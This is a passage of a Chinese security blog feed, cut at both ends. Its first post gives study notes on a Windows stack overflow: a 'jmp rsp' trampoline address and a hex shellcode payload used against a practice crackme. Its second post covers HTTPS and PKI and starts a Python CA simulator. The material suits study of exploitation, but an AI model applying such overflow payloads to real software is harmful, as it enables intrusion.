href="#开发shellcode需要解决的问题" class="headerlink" title="开发shellcode需要解决的问题"></a>开发shellcode需要解决的问题</h3><p>​通过上面的介绍，你应该已经明白了什么是<code>shellcode</code>，正是我们在第二章植入的那段机器码。在第二章的植入代码部分，我们是通过手动查找得到函数调用的地址以及函数返回地址，这显然不是通用的。加之，当存在缺陷的函数处于<code>ddl</code>中，并且被程序动态装载，地址每次都存在变化，这时就需要我们找到一种方式，使得能够自动定位到<code>shellcode</code>的地址。</p><h3 id="定位shellcode"><a href="#定位shellcode" class="headerlink" title="定位shellcode"></a>定位shellcode</h3><h4 id="栈帧移位与jmp-esp"><a href="#栈帧移位与jmp-esp" class="headerlink" title="栈帧移位与jmp esp"></a>栈帧移位与jmp esp</h4><p>关于栈帧移位，笔者在这里不太了解实际的过程，暂且记下，现在只关注如何动态定位。</p><p><img src="/2023/12/12/0Day%E5%AE%89%E5%85%A8%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%AC%AC2%E7%89%88%E9%98%85%E8%AF%BB%E9%9A%8F%E7%AC%943/Snipaste_2023-12-12_16-27-19.png"></p><p>​通过前两章的调试，我们其实已经很清楚指令执行和栈变化的过程，可以发现的是，每次函数调用完成之前，都会将之前减去的栈偏移加回来，所以我们可以发现，此时<code>esp</code>(64位下<code>rsp</code>)寄存器的内容正好在我们的返回地址的下一个位置，注意这里指的是栈上返回地址对应的地方，<code>esp</code>是栈帧指针。</p><p>​所以动态定位不就可以实现了，我们在系统找到一个<code>jmp rsp</code>指令的地址，然后在返回地址处填上这个地址，那么之后就会执行这个指令跳转到当前<code>rsp</code>存放的地址，也就是栈上淹没返回地址处后一个位置<code>shellcode</code>就在这之后执行。</p><p>所以重新的规划大概如下图：</p><p><img src="/2023/12/12/0Day%E5%AE%89%E5%85%A8%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%AC%AC2%E7%89%88%E9%98%85%E8%AF%BB%E9%9A%8F%E7%AC%943/Snipaste_2023-12-12_18-37-55.png"></p><h4 id="x64dbg如何搜索跳板指令位置"><a href="#x64dbg如何搜索跳板指令位置" class="headerlink" title="x64dbg如何搜索跳板指令位置"></a>x64dbg如何搜索跳板指令位置</h4><p>笔者之前已经提到，我是在64位机器上进行的操作，所以只能采用x64dbg，没有使用书里的OD，暂时没有找到什么好用的插件可以之间定位到我们需要的<code>dll</code>库中的跳板位置，所以这里我采用原始的搜索方式。</p><p>直接右键搜索命令：<code>jmp rsp</code></p><p><img src="/2023/12/12/0Day%E5%AE%89%E5%85%A8%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%AC%AC2%E7%89%88%E9%98%85%E8%AF%BB%E9%9A%8F%E7%AC%943/Snipaste_2023-12-12_18-58-55.png"></p><p><img src="/2023/12/12/0Day%E5%AE%89%E5%85%A8%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%AC%AC2%E7%89%88%E9%98%85%E8%AF%BB%E9%9A%8F%E7%AC%943/Snipaste_2023-12-12_18-59-11.png"></p><p>这里我就直接采用了第一个地址<code>00007FFC81014A53</code>，在内存布局中找到，确认是系统模块</p><p><img src="/2023/12/12/0Day%E5%AE%89%E5%85%A8%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%AC%AC2%E7%89%88%E9%98%85%E8%AF%BB%E9%9A%8F%E7%AC%943/Snipaste_2023-12-12_19-02-55.png"></p><h4 id="crack-me5"><a href="#crack-me5" class="headerlink" title="crack_me5"></a>crack_me5</h4><p>程序和crack_me4是一样的，只是我们要改变我们的劫持流程。</p><p>首先我们已经获取到了跳板地址，在上面，由于是系统模块，所以一般还是不会变的。然后找到<code>MessageBoxA</code>函数的地址，采用读书笔记2的方法。</p><p>可以发现这次的地址改变了，说明确实是动态加载的，所以这里应该有个疑问<code>MessageBoxA</code>的地址怎么动态获取，笔者在这里还不知道具体的解决方案。查到是<code>00007FFC8361A000</code>，查到ExitProcess函数的地址为<code>00007FFC82DEE3B0</code></p><p>下面制作我们所说的<code>exploit</code>：在之前的基础上加入了退出调用</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dns"><span class="hljs-number">3132333435363738313233343536373831323334353637383132333435363738313233343536373831323334353637383132333435363738534</span>A0181FC7F11114883EC4833DB5348B82165723068737833508BC45350505348B8A06183FC7F11111148C1E01848C1E810FFD04883C44848B8B0E3DE82FC7F111148C1E01048C1E810FFD<span class="hljs-number">04883C448</span><br></code></pre></td></tr></table></figure><p><img src="/2023/12/12/0Day%E5%AE%89%E5%85%A8%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%AC%AC2%E7%89%88%E9%98%85%E8%AF%BB%E9%9A%8F%E7%AC%943/Snipaste_2023-12-12_21-56-12.png"></p><p>然后进行调试过程：</p><p>我们在<code>strcpy</code>函数调用之后那个地方打断点，直接运行到那个地方，这里因为防止截断，我将64位中的0换为了1，然后在此时修改栈上的数据，目前没有找到更好的解决办法</p><p><img src="/2023/12/12/0Day%E5%AE%89%E5%85%A8%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%AC%AC2%E7%89%88%E9%98%85%E8%AF%BB%E9%9A%8F%E7%AC%943/Snipaste_2023-12-12_21-46-58.png"></p><p>已经跳转到了我们的跳板地址</p><p><img src="/2023/12/12/0Day%E5%AE%89%E5%85%A8%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%AC%AC2%E7%89%88%E9%98%85%E8%AF%BB%E9%9A%8F%E7%AC%943/Snipaste_2023-12-12_21-50-02.png"></p><p>这里参考读书笔记2，修改一下在栈上的执行权限，继续步进</p><p>可以发现已经如我们分析的那样，跳转回到了我们布置好的<code>shellcode</code>处</p><p><img src="/2023/12/12/0Day%E5%AE%89%E5%85%A8%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%AC%AC2%E7%89%88%E9%98%85%E8%AF%BB%E9%9A%8F%E7%AC%943/Snipaste_2023-12-12_21-52-35.png"></p><p>正常跳转到弹窗函数：</p><p><img src="/2023/12/12/0Day%E5%AE%89%E5%85%A8%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%AC%AC2%E7%89%88%E9%98%85%E8%AF%BB%E9%9A%8F%E7%AC%943/Snipaste_2023-12-12_21-57-18.png"></p><p>可以发现已经跳到退出函数的地方</p><p><img src="/2023/12/12/0Day%E5%AE%89%E5%85%A8%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%AC%AC2%E7%89%88%E9%98%85%E8%AF%BB%E9%9A%8F%E7%AC%943/Snipaste_2023-12-12_22-03-42.png"></p><p>然后就可以正常退出了，虽然不知道为何不能弹窗。唉</p>]]></content>
    
    
    <categories>
      
      <category>读书笔记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>读书笔记</tag>
      
      <tag>软件与系统安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HTTPS中的数字认证原理</title>
    <link href="/2023/12/09/HTTPS%E4%B8%AD%E7%9A%84%E6%95%B0%E5%AD%97%E8%AE%A4%E8%AF%81%E5%8E%9F%E7%90%86/"/>
    <url>/2023/12/09/HTTPS%E4%B8%AD%E7%9A%84%E6%95%B0%E5%AD%97%E8%AE%A4%E8%AF%81%E5%8E%9F%E7%90%86/</url>
    
    <content type="html"><![CDATA[<h2 id="HTTPS中的数字认证原理"><a href="#HTTPS中的数字认证原理" class="headerlink" title="HTTPS中的数字认证原理"></a>HTTPS中的数字认证原理</h2><p>笔者在近期学习了数字认证技术相关的东西，对其中公钥基础设施PKI进行较为深入的挖掘，于是写下此篇博客。🙈</p><span id="more"></span><h3 id="https与http"><a href="#https与http" class="headerlink" title="https与http"></a>https与http</h3><p>在开始CA相关的东西时，我们首先应该了解https和http。</p><p>HTTP（Hypertext Transfer Protocol）和HTTPS（HTTP Secure）是两种常见的用于在客户端和服务器之间传输数据的协议。<strong>从网络协议的底层来说，两者并无区别，但是https实现了更加安全的传输过程。</strong></p><p>具体有下面的区别：</p><ol><li>默认端口：http是80，https是443</li><li>传输内容：http是明文传输，https是加密传输</li><li>建立连接方式：http是直接连接，https需要SSL&#x2F;TLS握手过程</li></ol><h3 id="数字认证原理"><a href="#数字认证原理" class="headerlink" title="数字认证原理"></a>数字认证原理</h3><h4 id="公钥基础设施PKI"><a href="#公钥基础设施PKI" class="headerlink" title="公钥基础设施PKI"></a>公钥基础设施PKI</h4><p>举一个简单的例子，一个用户在浏览器里访问网站时，如何才能判别访问的网站是安全可信的呢？</p><p>此时只有引入绝对公正的第三方（一般为政府）作为证明者，证明所访问的网站是可信的，这就是公钥基础设施的由来。</p><p>我们已经知道，https在为客户端和服务端建立连接之前需要进行SSL&#x2F;TLS握手过程，那么这个过程的实现基础就是PKI。</p><p>那么PKI中，用什么作为信任根或者说信任凭证呢，就是我们常说的证书啦😀</p><p><strong>数字证书是最常见的证书类型，它包含了公钥、实体的身份信息以及证书颁发机构的签名。理所当然的，证书使用的是非对称密码体制。正常情况下，系统会安装CA的根证书用于验证其签发的证书</strong></p><p>目前的浏览器会对用户进行提醒，如果网站的证书过期，会提示有风险。</p><p><img src="/2023/12/09/HTTPS%E4%B8%AD%E7%9A%84%E6%95%B0%E5%AD%97%E8%AE%A4%E8%AF%81%E5%8E%9F%E7%90%86/Snipaste_2023-12-08_20-35-07.png"></p><h4 id="证书颁发机构CA-注册机构RA"><a href="#证书颁发机构CA-注册机构RA" class="headerlink" title="证书颁发机构CA&amp;&amp;注册机构RA"></a>证书颁发机构CA&amp;&amp;注册机构RA</h4><p>RA是注册机构（Registration Authority）的缩写。</p><p>在公钥基础设施（PKI）中，注册机构是与证书颁发机构（CA）合作的实体，负责收集、审核和验证实体的身份信息，并向CA提供这些信息以用于数字证书的签发。注册机构在PKI中发挥重要的角色，它们与CA一起确保数字证书的可信性和准确性。注册机构负责收集申请者的身份信息，可能包括个人身份证明、组织文件、域名所有权验证等。注册机构会对这些信息进行审核和验证，确保其真实性和合法性。</p><p>CA是证书颁发机构（Certificate Authority）的缩写。</p><p>证书颁发机构是一个受信任的实体，负责签发和管理数字证书，以验证实体的身份和信息的真实性。在公钥基础设施（PKI）中，<strong>CA是PKI体系结构的核心组成部分之一</strong>。它们使用自己的私钥对数字证书进行签名，并为实体（如网站、个人或设备）颁发包含公钥和身份信息的数字证书。</p><p>CA的主要职责包括：</p><ol><li>身份验证：CA会对申请数字证书的实体进行身份验证，以确保其合法性和真实性。这可以包括验证个人的身份证明、组织的注册文件、域名所有权等，当然也可以通过RA进行代理。</li><li>签发证书：一旦CA验证了申请者的身份信息，它会<strong>使用自己的私钥和根证书对数字证书进行签名</strong>，并将证书发送给申请者。该证书包含了实体的公钥、身份信息以及CA的签名。</li><li>证书管理：CA负责管理已签发的数字证书。这包括证书的更新、吊销和过期处理等操作。CA还维护一个公共的证书撤销列表（CRL），其中包含已吊销的证书的信息。</li><li>可信性建立：由于CA是受信任的实体，其签名可以用于验证数字证书的真实性和完整性。其他实体可以通过验证证书的签名和查看CA的信任列表来确认证书的有效性。</li></ol><h3 id="证书的颁发-验证"><a href="#证书的颁发-验证" class="headerlink" title="证书的颁发&amp;验证"></a>证书的颁发&amp;验证</h3><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>从上文已经知道，证书的颁发和验证是通过CA来完成的，那么下面具体讲一讲实现过程。</p><p>一般来说，在单向认证过程中只需要用户验证服务端证书，只有服务端需要请求CA颁发证书。那么服务端，具体来讲就是一个网站，需要向CA申请一个证书，首先发送证书签发请求，然后通过CA的身份验证合法性后，继续向CA发送一个证书请求文件CSR，CA在接收到证书请求文件后，会使用根证书和私钥对其进行签名，然后就会生成一个证书文件CRT，返回给服务端。</p><p>大概过程如下：</p><p><img src="/2023/12/09/HTTPS%E4%B8%AD%E7%9A%84%E6%95%B0%E5%AD%97%E8%AE%A4%E8%AF%81%E5%8E%9F%E7%90%86/CA%E9%A2%81%E5%8F%91%E8%BF%87%E7%A8%8B.png"></p><p>证书的验证是通过系统安装的CA机构的根证书来验证的。</p><p>那么双向认证是基于单向认证的，很好理解，笔者将双向认证的过程也画了一张图😋：</p><p><img src="/2023/12/09/HTTPS%E4%B8%AD%E7%9A%84%E6%95%B0%E5%AD%97%E8%AE%A4%E8%AF%81%E5%8E%9F%E7%90%86/%E5%8F%8C%E5%90%91%E8%AE%A4%E8%AF%81%E8%BF%87%E7%A8%8B.png"></p><h4 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h4><p>笔者知道，上面的文字叙述过于繁琐，那么下面笔者上代码，这是笔者用Python和OpenSSL库开发的一个的基于双向认证的CA签发模拟程序。</p><p>大概有如下效果：</p><p><img src="/2023/12/09/HTTPS%E4%B8%AD%E7%9A%84%E6%95%B0%E5%AD%97%E8%AE%A4%E8%AF%81%E5%8E%9F%E7%90%86/Snipaste_2023-12-08_21-11-34.png"></p><p><img src="/2023/12/09/HTTPS%E4%B8%AD%E7%9A%84%E6%95%B0%E5%AD%97%E8%AE%A4%E8%AF%81%E5%8E%9F%E7%90%86/Snipaste_2023-12-08_21-12-47.png"></p><p><img src="/2023/12/09/HTTPS%E4%B8%AD%E7%9A%84%E6%95%B0%E5%AD%97%E8%AE%A4%E8%AF%81%E5%8E%9F%E7%90%86/Snipaste_2023-12-08_21-12-57.png"></p><p><img src="/2023/12/09/HTTPS%E4%B8%AD%E7%9A%84%E6%95%B0%E5%AD%97%E8%AE%A4%E8%AF%81%E5%8E%9F%E7%90%86/Snipaste_2023-12-08_21-13-27.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> subprocess<br><span class="hljs-keyword">import</span> socket<br><span class="hljs-keyword">import</span> concurrent.futures<br><span class="hljs-keyword">from</span> pathlib <span class="hljs-keyword">import</span> Path<br><br>CA_host = <span class="hljs-string">&quot;x.x.x.x&quot;</span><br>CA_port = <span class="hljs-number">54321</span><br>CA_download_port = <span class="hljs-number">12345</span><br>cert_num = <span class="hljs-number">0</span><br><br><span class="hljs-comment"># 根证书生成</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Gen_rootCA</span>():<br>    <span class="hljs-comment"># 生成私钥</span><br>    subprocess.run([<span class="hljs-string">&#x27;openssl&#x27;</span>, <span class="hljs-string">&#x27;genrsa&#x27;</span>, <span class="hljs-string">&#x27;-des3&#x27;</span>, <span class="hljs-string">&#x27;-passout&#x27;</span>, <span class="hljs-string">&#x27;pass:3xsh0re&#x27;</span>, <span class="hljs-string">&#x27;-out&#x27;</span>, <span class="hljs-string">&#x27;rootCA.key&#x27;</span>, <span class="hljs-string">&#x27;2048&#x27;</span>])<br>    <span class="hljs-comment"># 指定证书主题字段信息</span><br>    subject_info = <span class="hljs-string">&quot;/C=CN/ST=Beijing/L=Haidian/O=USTB/OU=USTB_CA/CN=USTB.CA&quot;</span><br>    <span class="hljs-comment"># 生成自签名证书</span><br>    subprocess.run(<br>        [<span class="hljs-string">&#x27;openssl&#x27;</span>, <span class="hljs-string">&#x27;req&#x27;</span>, <span class="hljs-string">&#x27;-new&#x27;</span>, <span class="hljs-string">&#x27;-x509&#x27;</span>, <span class="hljs-string">&#x27;-passin&#x27;</span>, <span class="hljs-string">&#x27;pass:3xsh0re&#x27;</span>, <span class="hljs-string">&#x27;-key&#x27;</span>, <span class="hljs-string">&#x27;rootCA.key&#x27;</span>, <span class="hljs-string">&#x27;-days&#x27;</span>, <span class="hljs-string">&#x27;365&#x27;</span>, <span class="hljs-string">&#x27;-out&#x27;</span>,<br>         <span class="hljs-string">&#x27;rootCA.crt&#x27;</span>, <span class="hljs-string">&#x27;-subj&#x27;</span>, subject_info], capture_output=<span class="hljs-literal">True</span>)<br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\033[32m[+]\033[0m自签名证书生成完成&quot;</span>)<br><br><br><span class="hljs-comment"># 为申请者生成证书</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Sign_Cert</span>():<br>    <span class="hljs-keyword">with</span> socket.socket(socket.AF_INET, socket.SOCK_STREAM) <span class="hljs-keyword">as</span> CA_socket:<br>        CA_socket.bind((<span class="hljs-string">&quot;0.0.0.0&quot;</span>, CA_port))<br>        CA_socket.listen(<span class="hljs-number">1</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;\033[32m[+]\033[0m等待客户端连接...&#x27;</span>)<br>        <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>            conn, addr = CA_socket.accept()<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;\033[32m[+]\033[0m自<span class="hljs-subst">&#123;addr[<span class="hljs-number">0</span>]&#125;</span>的申请者已连接&#x27;</span>)<br><br>            <span class="hljs-comment"># 生成证书号</span><br>            <span class="hljs-keyword">global</span> cert_num<br>            sig = <span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;addr[<span class="hljs-number">0</span>].replace(<span class="hljs-string">&quot;.&quot;</span>, <span class="hljs-string">&quot;&quot;</span>)&#125;</span>_<span class="hljs-subst">&#123;addr[<span class="hljs-number">1</span>]&#125;</span>_<span class="hljs-subst">&#123;cert_num&#125;</span>&#x27;</span><br>            cert_num += <span class="hljs-number">1</span><br>            <span class="hljs-keyword">with</span> conn:<br>                conn.settimeout(<span class="hljs-number">2</span>)<br>                csr_data = <span class="hljs-string">b&#x27;&#x27;</span><br>                <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>                    <span class="hljs-keyword">try</span>:<br>                        data = conn.recv(<span class="hljs-number">1024</span>)<br>                        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(data) == <span class="hljs-number">0</span>:<br>                            <span class="hljs-keyword">break</span><br>                        csr_data += data<br>                        <span class="hljs-keyword">pass</span><br>                    <span class="hljs-keyword">except</span> socket.timeout:<br>                        <span class="hljs-keyword">break</span><br>                <span class="hljs-comment"># 生成 req.csr 文件</span><br>                <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">f&#x27;req_<span class="hljs-subst">&#123;sig&#125;</span>.csr&#x27;</span>, <span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> csr_file:<br>                    csr_file.write(csr_data)<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;\033[32m[+]\033[0m申请文件CSR接收成功&#x27;</span>)<br>                <span class="hljs-comment"># 在这里处理证书请求文件的数据</span><br>                command = [<br>                    <span class="hljs-string">&#x27;openssl&#x27;</span>, <span class="hljs-string">&#x27;x509&#x27;</span>,<br>                    <span class="hljs-string">&#x27;-req&#x27;</span>, <span class="hljs-string">&#x27;-CA&#x27;</span>, <span class="hljs-string">&#x27;./rootCA.crt&#x27;</span>,<br>                    <span class="hljs-string">&#x27;-CAkey&#x27;</span>, <span class="hljs-string">&#x27;rootCA.key&#x27;</span>,<br>                    <span class="hljs-string">&#x27;-CAcreateserial&#x27;</span>,<br>                    <span class="hljs-string">&#x27;-in&#x27;</span>, <span class="hljs-string">f&#x27;./req_<span class="hljs-subst">&#123;sig&#125;</span>.csr&#x27;</span>,<br>                    <span class="hljs-string">&#x27;-passin&#x27;</span>, <span class="hljs-string">&#x27;pass:3xsh0re&#x27;</span>,<br>                    <span class="hljs-string">&#x27;-out&#x27;</span>, <span class="hljs-string">f&#x27;./req_<span class="hljs-subst">&#123;sig&#125;</span>.crt&#x27;</span>,<br>                    <span class="hljs-string">&#x27;-days&#x27;</span>, <span class="hljs-string">&#x27;365&#x27;</span><br>                ]<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\033[32m[+]\033[0m正在查验申请者资质......&quot;</span>)<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\033[32m[+]\033[0m打印签发信息:&quot;</span>)<br>                <span class="hljs-keyword">try</span>:<br>                    subprocess.run(command, stdout=subprocess.DEVNULL)<br>                    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;\033[32m[+]\033[0m来自<span class="hljs-subst">&#123;addr[<span class="hljs-number">0</span>]&#125;</span>的申请者的证书签署完成&quot;</span>)<br>                <span class="hljs-keyword">except</span> subprocess.CalledProcessError <span class="hljs-keyword">as</span> e:<br>                    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\033[31m[-]当前系统没有安装OpenSSL库\033[0m&quot;</span>)<br><br>                <span class="hljs-comment"># 传送CRT</span><br>                <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">f&#x27;./req_<span class="hljs-subst">&#123;sig&#125;</span>.crt&#x27;</span>, <span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> file:<br>                    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>                        data = file.read(<span class="hljs-number">1024</span>)<br>                        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> data:<br>                            <span class="hljs-keyword">break</span><br>                        <span class="hljs-keyword">if</span> conn.getsockopt(socket.SOL_SOCKET, socket.SO_ERROR) == <span class="hljs-number">0</span>:<br>                            conn.sendall(data)<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;\033[32m[+]\033[0m证书发送完成!&#x27;</span>)<br>                conn.close()<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;\033[32m[+]\033[0m本次签发结束!\n-------------------------------------------------------&#x27;</span>)<br><br><br><span class="hljs-comment"># CA提供根证书下载</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Download_rootCA</span>():<br>    <span class="hljs-keyword">with</span> socket.socket(socket.AF_INET, socket.SOCK_STREAM) <span class="hljs-keyword">as</span> CA_Download_socket:<br>        CA_Download_socket.bind((<span class="hljs-string">&quot;0.0.0.0&quot;</span>, CA_download_port))<br>        CA_Download_socket.listen(<span class="hljs-number">1</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;\033[32m[+]rootCA下载端口开放中...\033[0m&#x27;</span>)<br>        <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>            conn, addr = CA_Download_socket.accept()<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;\033[32m[+]\033[0m自<span class="hljs-subst">&#123;addr[<span class="hljs-number">0</span>]&#125;</span>的下载者已连接&#x27;</span>)<br>            <span class="hljs-comment"># 传送rootCA.crt</span><br>            <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">f&#x27;./rootCA.crt&#x27;</span>, <span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> file:<br>                <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>                    conn.settimeout(<span class="hljs-number">2</span>)<br>                    data = file.read(<span class="hljs-number">1024</span>)<br>                    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> data:<br>                        <span class="hljs-keyword">break</span><br>                    <span class="hljs-keyword">if</span> conn.getsockopt(socket.SOL_SOCKET, socket.SO_ERROR) == <span class="hljs-number">0</span>:<br>                        conn.sendall(data)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;\033[32m[+]\033[0mrootCA.crt发送完成!\n---------------------------------------------------&#x27;</span>)<br>            conn.close()<br>    <span class="hljs-keyword">pass</span><br><br><br><span class="hljs-comment"># 